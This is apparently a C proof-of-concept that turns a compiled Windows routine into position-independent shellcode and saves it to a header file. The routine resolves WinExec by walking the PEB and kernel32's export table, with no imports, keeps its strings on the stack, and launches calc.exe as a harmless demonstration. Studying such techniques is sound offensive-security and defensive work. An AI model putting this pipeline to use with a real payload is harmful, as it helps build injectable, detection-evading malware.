/*
Code inspiration from
https://steve-s.gitbook.io/0xtriboulet/just-malicious/from-c-with-inline-assembly-to-shellcode
*/

#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <intrin.h>

#include "../../includes/structs.h"
#include "../../../commons/includes/commons.h"
#include "../../../commons/includes/compiler.h"

#define STR_BUFFER_SIZE 4096

typedef UINT(WINAPI* WinExec_t)(LPCSTR lpCmdLine, UINT uCmdShow);

INT mem_cmp(CONST VOID* str1, CONST VOID* str2, SIZE_T n);
HANDLE LocalGetModuleHandle(CONST CHAR* sModuleName);
PVOID LocalGetProcAddress(HANDLE pBase, CONST CHAR* sFuncName);

INT main() {
  unsigned char* begin_addr = (unsigned char*)get_address_after_call();

  const char sKernel32[] = {'K', 'E', 'R', 'N', 'E', 'L', '3', '2', '\0'};

  const char sWinExec[] = {'W', 'i', 'n', 'E', 'x', 'e', 'c', '\0'};

  const char sCalcExe[] = {
      'c', 'a', 'l', 'c', '.', 'e', 'x', 'e', '\0',
  };

  WinExec_t pWinExec =
      (WinExec_t)LocalGetProcAddress(LocalGetModuleHandle(sKernel32), sWinExec);
  pWinExec(sCalcExe, 0);

  unsigned char* end_addr = (unsigned char*)get_address_after_call();

  const int instructions_before_return = 5;
  end_addr -= instructions_before_return;

  printf("Start address: %p\n", begin_addr);
  printf("End address: %p\n", end_addr);

  char* str_buffer = malloc(256);
  size_t offset = 0;
  offset +=
      sprintf_s(str_buffer + offset, 256, "unsigned char shellcode[] = {");

  // save original rbp
  const char* push_rbp = "0x55, ";
  //  Align the stack
  const char* and_rsp_0xfffffffffffffff0 = "0x48, 0x83, 0xE4, 0xF0, ";
  // Allocate stack
  const char* sub_rsp_0x1000 = "0x48, 0x81, 0xEC, 0x00, 0x10, 0x00, 0x00, ";
  const char* mov_rbp_rsp = "0x48, 0x89, 0xE5, ";

  str_buffer = realloc(str_buffer, STR_BUFFER_SIZE);
  offset += sprintf_s(str_buffer + offset, STR_BUFFER_SIZE, push_rbp);
  offset += sprintf_s(str_buffer + offset, STR_BUFFER_SIZE,
                      and_rsp_0xfffffffffffffff0);
  offset += sprintf_s(str_buffer + offset, STR_BUFFER_SIZE, sub_rsp_0x1000);
  offset += sprintf_s(str_buffer + offset, STR_BUFFER_SIZE, mov_rbp_rsp);

  uc_buffer opcodes_raw = get_self_asm_bytes(begin_addr, end_addr);
  opcode_str_buffer opcodes_str = asm_opcodes_to_string(opcodes_raw, true);
  free(opcodes_raw.buffer);

  offset += sprintf_s(str_buffer + offset, STR_BUFFER_SIZE, opcodes_str.buffer);
  free(opcodes_str.buffer);

  // Cleanup stack
  const char* add_rsp_0x1000 = "0x48, 0x81, 0xC4, 0x00, 0x10, 0x00, 0x00, ";
  // restore original rbp
  const char* const pop_rbp = "0x5D, ";
  // return to caller after shellcode execution
  const char* const ret = "0xC3};\n";

  offset += sprintf_s(str_buffer + offset, STR_BUFFER_SIZE, add_rsp_0x1000);
  offset += sprintf_s(str_buffer + offset, STR_BUFFER_SIZE, pop_rbp);
  sprintf_s(str_buffer + offset, STR_BUFFER_SIZE, ret);

  printf("%s\n", str_buffer);

  FILE* file;
  file = fopen("./shellcodes/generate_shellcode.h", "w");

  if (file == NULL) {
    perror("Failed to open the file for writing.");
    exit(EXIT_FAILURE);
  }

  fprintf(file, "// This file was generated by the shellcode_gen_msvc_c\n");
  fprintf(file, "#pragma once\n");
  fprintf(file, "%s", str_buffer);
  fclose(file);
  free(str_buffer);

  return EXIT_SUCCESS;
}

__forceinline HANDLE LocalGetModuleHandle(CONST CHAR* sModuleName) {
  PPEB pPeb = NULL;
  HANDLE pBase = NULL;

  //  PEB
  pPeb = (PPEB)__readgsqword(0x60);

  //  Getting the Ldr
  PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);

  //  Getting the first element in the linked list which contains information
  //  about the first module
  PLDR_DATA_TABLE_ENTRY pDte =
      (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

  while (pDte) {
    //  If not null
    if (pDte->FullDllName.Length != (USHORT)0x0) {
      //  Check if both equal
      if (mem_cmp(pDte->FullDllName.Buffer, sModuleName, 0x1) == 0) {
        //  Found sModuleName
        pBase = (HMODULE)(pDte->InInitializationOrderLinks.Flink);

        return pBase;
      }

    } else {
      break;
    }

    //  Next element in the linked list
    pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
  }

  return NULL;
}

__forceinline PVOID LocalGetProcAddress(HANDLE vpBase, CONST CHAR* sFuncName) {
  unsigned char* pBase = (unsigned char*)vpBase;

  //  Getting the dos header and doing a signature check
  PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;

  //  Getting the nt headers and doing a signature check
  PIMAGE_NT_HEADERS pImgNtHdrs =
      (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);

  //  Getting the optional header
  IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;

  //  Getting the image export table
  PIMAGE_EXPORT_DIRECTORY pImgExportDir =
      (PIMAGE_EXPORT_DIRECTORY)(pBase +
                                ImgOptHdr
                                    .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                                    .VirtualAddress);

  //  Getting the function's names array pointer
  PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);

  //  Getting the function's addresses array pointer
  PDWORD FunctionAddressArray =
      (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);

  //  Getting the function's ordinal array pointer
  PWORD FunctionOrdinalArray =
      (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

  //  Looping through all the exported functions
  for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
    //  Getting the name of the function
    CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);

    //  Getting the address of the function through its ordinal
    PVOID pFunctionAddress =
        (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

    //  Searching for the function specified
    if (mem_cmp(sFuncName, pFunctionName, 0x7) == 0) {
      return pFunctionAddress;
    }
  }

  return NULL;
}

__forceinline INT mem_cmp(CONST VOID* str1, CONST VOID* str2, SIZE_T n) {
  CONST UCHAR* s1 = (CONST UCHAR*)str1;
  CONST UCHAR* s2 = (CONST UCHAR*)str2;

  while (n--) {
    if (*s1 != *s2) return *s1 - *s2;
    s1++;
    s2++;
  }
  return 0;
}